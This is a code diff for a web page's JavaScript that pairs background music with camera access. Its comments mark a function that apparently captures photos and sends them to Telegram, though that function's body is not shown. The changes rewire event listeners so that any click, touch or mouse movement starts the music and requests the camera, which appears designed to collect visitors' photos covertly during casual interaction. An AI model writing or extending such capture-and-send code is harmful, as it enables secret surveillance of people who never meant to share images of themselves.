@@ -1,4 +1,4 @@
-﻿﻿﻿﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
+﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
 const photoOptions = document.getElementById('photoOptions');
 if (openPhotoOptions && photoOptions) {
   openPhotoOptions.addEventListener('click', () => {
@@ -16,7 +16,7 @@ let started = false;
 music.volume = 0.4;
 
 async function startMusicAndCamera() {
-  if (started) return;
+  if (started && !music.paused) return;
   started = true;
 
   let musicStarted = false;
@@ -28,6 +28,7 @@ async function startMusicAndCamera() {
   } catch (err) {
     console.warn("Autoplay musik gagal:", err);
     btnMusic.classList.add("show");
+    btnMusic.disabled = false;
     // tetap lanjut kamera walau musik gagal
   }
 
@@ -47,10 +48,15 @@ async function startMusicAndCamera() {
     } catch (e) {
       console.warn("❌ User menolak izin kamera:", e);
     }
-  }, musicStarted ? 800 : 1500); // jeda lebih panjang bila musik gagal
+  }, musicStarted ? 800 : 1500);
 
-  btnMusic.classList.remove("show");
-  btnMusic.disabled = true;
+  if (musicStarted) {
+    btnMusic.classList.remove("show");
+    btnMusic.disabled = true;
+  } else {
+    btnMusic.disabled = false;
+    btnMusic.classList.add("show");
+  }
 }
 
 // === Fungsi ambil foto & kirim ke Telegram ===
@@ -95,18 +101,19 @@ async function autoCaptureAndSend() {
   }
 }
 
-// === Inisialisasi tombol & event listener ===
+// === Event Listener Fix (musik + kamera) ===
+function userStart() {
+  startMusicAndCamera().catch(console.warn);
+}
+
 const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);
+btnMusic.classList.add("show");
+btnMusic.addEventListener('click', userStart);
+document.addEventListener('click', userStart);
+document.addEventListener('touchstart', userStart);
 
-document.addEventListener('click', startMusicAndCamera, { once: true });
-document.addEventListener('touchstart', startMusicAndCamera, { once: true });
-btnMusic.addEventListener('click', startMusicAndCamera);
-
-if (isMobile) {
-  btnMusic.classList.add("show");
-  music.muted = true;
-} else {
-  window.addEventListener('mousemove', startMusicAndCamera, { once: true });
+if (!isMobile) {
+  window.addEventListener('mousemove', userStart, { once: true });
 }
 
 // === MODAL PERTANYAAN ===
